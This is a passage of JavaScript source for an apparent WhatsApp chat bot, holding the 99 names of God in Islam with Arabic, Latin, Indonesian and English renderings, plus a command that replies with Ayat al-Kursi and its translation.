translation_en: "The Giver of Honor"
},
{
index: 25,
latin: "Al Mudzil",
arabic: "المُذِلُّ",
translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
translation_en: "The Giver of Dishonor"
},
{
index: 26,
latin: "Al Samii’",
arabic: "السَّمِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
translation_en: "The All Hearing"
},
{
index: 27,
latin: "Al Bashiir",
arabic: "الْبَصِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
translation_en: "The All Seeing"
},
{
index: 28,
latin: "Al Hakam",
arabic: "الْحَكَمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
translation_en: "The Judge, the Arbitrator"
},
{
index: 29,
latin: "Al ‘Adl",
arabic: "الْعَدْلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Utterly Just"
},
{
index: 30,
latin: "Al Lathiif",
arabic: "اللَّطِيفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
translation_en: "The Subtly Kind"
},
{
index: 31,
latin: "Al Khabiir",
arabic: "الْخَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
translation_en: "The All Aware"
},
{
index: 32,
latin: "Al Haliim",
arabic: "الْحَلِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
translation_en: "The Forbearing, the Indulgent"
},
{
index: 33,
latin: "Al ‘Azhiim",
arabic: "الْعَظِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
translation_en: "The Magnificent, the Infinite"
},
{
index: 34,
latin: "Al Ghafuur",
arabic: "الْغَفُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
translation_en: "The All Forgiving"
},
{
index: 35,
latin: "As Syakuur",
arabic: "الشَّكُورُ",
translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
translation_en: "The Grateful"
},
{
index: 36,
latin: "Al ‘Aliy",
arabic: "الْعَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Sublimely Exalted"
},
{
index: 37,
latin: "Al Kabiir",
arabic: "الْكَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
translation_en: "The Great"
},
{
index: 38,
latin: "Al Hafizh",
arabic: "الْحَفِيظُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
translation_en: "The Preserver"
},
{
index: 39,
latin: "Al Muqiit",
arabic: "المُقيِت",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
translation_en: "The Nourisher"
},
{
index: 40,
latin: "Al Hasiib",
arabic: "الْحسِيبُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
translation_en: "The Reckoner"
},
{
index: 41,
latin: "Al Jaliil",
arabic: "الْجَلِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Majestic"
},
{
index: 42,
latin: "Al Kariim",
arabic: "الْكَرِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
translation_en: "The Bountiful, the Generous"
},
{
index: 43,
latin: "Ar Raqiib",
arabic: "الرَّقِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
translation_en: "The Watchful"
},
{
index: 44,
latin: "Al Mujiib",
arabic: "الْمُجِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
translation_en: "The Responsive, the Answerer"
},
{
index: 45,
latin: "Al Waasi’",
arabic: "الْوَاسِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
translation_en: "The Vast, the All Encompassing"
},
{
index: 46,
latin: "Al Hakiim",
arabic: "الْحَكِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
translation_en: "The Wise"
},
{
index: 47,
latin: "Al Waduud",
arabic: "الْوَدُودُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
translation_en: "The Loving, the Kind One"
},
{
index: 48,
latin: "Al Majiid",
arabic: "الْمَجِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The All Glorious"
},
{
index: 49,
latin: "Al Baa’its",
arabic: "الْبَاعِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
translation_en: "The Raiser of the Dead"
},
{
index: 50,
latin: "As Syahiid",
arabic: "الشَّهِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
translation_en: "The Witness"
},
{
index: 51,
latin: "Al Haqq",
arabic: "الْحَقُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
translation_en: "The Truth, the Real"
},
{
index: 52,
latin: "Al Wakiil",
arabic: "الْوَكِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
translation_en: "The Trustee, the Dependable"
},
{
index: 53,
latin: "Al Qawiyyu",
arabic: "الْقَوِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
translation_en: "The Strong"
},
{
index: 54,
latin: "Al Matiin",
arabic: "الْمَتِينُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
translation_en: "The Firm, the Steadfast"
},
{
index: 55,
latin: "Al Waliyy",
arabic: "الْوَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
translation_en: "The Protecting Friend, Patron, and Helper"
},
{
index: 56,
latin: "Al Hamiid",
arabic: "الْحَمِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
translation_en: "The All Praiseworthy"
},
{
index: 57,
latin: "Al Mushii",
arabic: "الْمُحْصِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
translation_en: "The Accounter, the Numberer of All"
},
{
index: 58,
latin: "Al Mubdi’",
arabic: "الْمُبْدِئُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
translation_en: "The Producer, Originator, and Initiator of all"
},
{
index: 59,
latin: "Al Mu’iid",
arabic: "الْمُعِيدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
translation_en: "The Reinstater Who Brings Back All"
},
{
index: 60,
latin: "Al Muhyii",
arabic: "الْمُحْيِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
translation_en: "The Giver of Life"
},
{
index: 61,
latin: "Al Mumiitu",
arabic: "اَلْمُمِيتُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
translation_en: "The Bringer of Death, the Destroyer"
},
{
index: 62,
latin: "Al Hayyu",
arabic: "الْحَيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
translation_en: "The Ever Living"
},
{
index: 63,
latin: "Al Qayyuum",
arabic: "الْقَيُّومُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
translation_en: "The Self Subsisting Sustainer of All"
},
{
index: 64,
latin: "Al Waajid",
arabic: "الْوَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
translation_en: "The Perceiver, the Finder, the Unfailing"
},
{
index: 65,
latin: "Al Maajid",
arabic: "الْمَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Illustrious, the Magnificent"
},
{
index: 66,
latin: "Al Wahiid",
arabic: "الْواحِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
translation_en: "The One, The Unique, Manifestation of Unity"
},
{
index: 67,
latin: "Al ‘Ahad",
arabic: "اَلاَحَدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
translation_en: "The One, the All Inclusive, the Indivisible"
},
{
index: 68,
latin: "As Shamad",
arabic: "الصَّمَدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
},
{
index: 69,
latin: "Al Qaadir",
arabic: "الْقَادِرُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
translation_en: "The All Able"
},
{
index: 70,
latin: "Al Muqtadir",
arabic: "الْمُقْتَدِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
translation_en: "The All Determiner, the Dominant"
},
{
index: 71,
latin: "Al Muqaddim",
arabic: "الْمُقَدِّمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
translation_en: "The Expediter, He who brings forward"
},
{
index: 72,
latin: "Al Mu’akkhir",
arabic: "الْمُؤَخِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
translation_en: "The Delayer, He who puts far away"
},
{
index: 73,
latin: "Al Awwal",
arabic: "الأوَّلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
translation_en: "The First"
},
{
index: 74,
latin: "Al Aakhir",
arabic: "الآخِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
translation_en: "The Last"
},
{
index: 75,
latin: "Az Zhaahir",
arabic: "الظَّاهِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
translation_en: "The Manifest; the All Victorious"
},
{
index: 76,
latin: "Al Baathin",
arabic: "الْبَاطِنُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
translation_en: "The Hidden; the All Encompassing"
},
{
index: 77,
latin: "Al Waali",
arabic: "الْوَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
translation_en: "The Patron"
},
{
index: 78,
latin: "Al Muta’aalii",
arabic: "الْمُتَعَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Self Exalted"
},
{
index: 79,
latin: "Al Barri",
arabic: "الْبَرُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
translation_en: "The Most Kind and Righteous"
},
{
index: 80,
latin: "At Tawwaab",
arabic: "التَّوَابُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
translation_en: "The Ever Returning, Ever Relenting"
},
{
index: 81,
latin: "Al Muntaqim",
arabic: "الْمُنْتَقِمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
translation_en: "The Avenger"
},
{
index: 82,
latin: "Al Afuww",
arabic: "العَفُوُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
translation_en: "The Pardoner, the Effacer of Sins"
},
{
index: 83,
latin: "Ar Ra`uuf",
arabic: "الرَّؤُوفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
translation_en: "The Compassionate, the All Pitying"
},
{
index: 84,
latin: "Malikul Mulk",
arabic: "مَالِكُ الْمُلْكِ",
translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
translation_en: "The Owner of All Sovereignty"
},
{
index: 85,
latin: "Dzul JalaaliWal Ikraam",
arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
translation_en: "The Lord of Majesty and Generosity"
},
{
index: 86,
latin: "Al Muqsith",
arabic: "الْمُقْسِطُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Equitable, the Requiter"
},
{
index: 87,
latin: "Al Jamii’",
arabic: "الْجَامِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
translation_en: "The Gatherer, the Unifier"
},
{
index: 88,
latin: "Al Ghaniyy",
arabic: "الْغَنِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
translation_en: "The All Rich, the Independent"
},
{
index: 89,
latin: "Al Mughnii",
arabic: "الْمُغْنِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
translation_en: "The Enricher, the Emancipator"
},
{
index: 90,
latin: "Al Maani",
arabic: "اَلْمَانِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
translation_en: "The Withholder, the Shielder, the Defender"
},
{
index: 91,
latin: "Ad Dhaar",
arabic: "الضَّارَّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
translation_en: "The Distressor, the Harmer"
},
{
index: 92,
latin: "An Nafii’",
arabic: "النَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
translation_en: "The Propitious, the Benefactor"
},
{
index: 93,
latin: "An Nuur",
arabic: "النُّورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
translation_en: "The Light"
},
{
index: 94,
latin: "Al Haadii",
arabic: "الْهَادِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
translation_en: "The Guide"
},
{
index: 95,
latin: "Al Baadii",
arabic: "الْبَدِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
translation_en: "Incomparable, the Originator"
},
{
index: 96,
latin: "Al Baaqii",
arabic: "اَلْبَاقِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
translation_en: "The Ever Enduring and Immutable"
},
{
index: 97,
latin: "Al Waarits",
arabic: "الْوَارِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
translation_en: "The Heir, the Inheritor of All"
},
{
index: 98,
latin: "Ar Rasyiid",
arabic: "الرَّشِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
translation_en: "The Guide, Infallible Teacher, and Knower"
},
{
index: 99,
latin: "As Shabuur",
arabic: "الصَّبُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
translation_en: "The Patient"
}
]
let json = JSON.parse(JSON.stringify(global.asmaulhusna))
let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
if (args[0]) {
if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
return m.reply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
}
m.reply(contoh + data + anjuran)
}
break
case "ayatkursi": {
let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
m.reply(caption)
}
break
default: {
if (isCmd2 && budy.toLowerCase() != undefined) {
if (m.chat.endsWith("broadcast")) return;
if (m.isBaileys) return;
if (!budy.toLowerCase()) return;
if (argsLog || (isCmd2 && !m.isGroup)) {
console.log(chalk.black(chalk.bgRed("⫹ 𝙴𝚁𝚁𝙾𝚁 ⫺")), 
color("command", "turquoise"), 
color(`${prefix}${command}`, "turquoise"), 
color("𝚃𝙸𝙳𝙰𝙺 𝚃𝙴𝚁𝚂𝙴𝙳𝙸𝙰 [⚠]", "turquoise"));
} else if (argsLog || (isCmd2 && m.isGroup)) {
console.log(chalk.black(chalk.bgRed("⫹ 𝙴𝚁𝚁𝙾𝚁 ⫺")), 
color("command", "turquoise"), 
color(`${prefix}${command}`, "turquoise"), 
color("𝚃𝙸𝙳𝙰𝙺 𝚃𝙴𝚁𝚂𝙴𝙳𝙸𝙰 [⚠]", "turquoise"));
}
}
}
}
}
} catch (err) {
m.reply(util.format(err));
}
};
//=================================================//
let file = require.resolve(__filename);
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(chalk.redBright(`𝚄𝚙𝚍𝚊𝚝𝚎 ${__filename}`));
delete require.cache[file];
require(file);
});
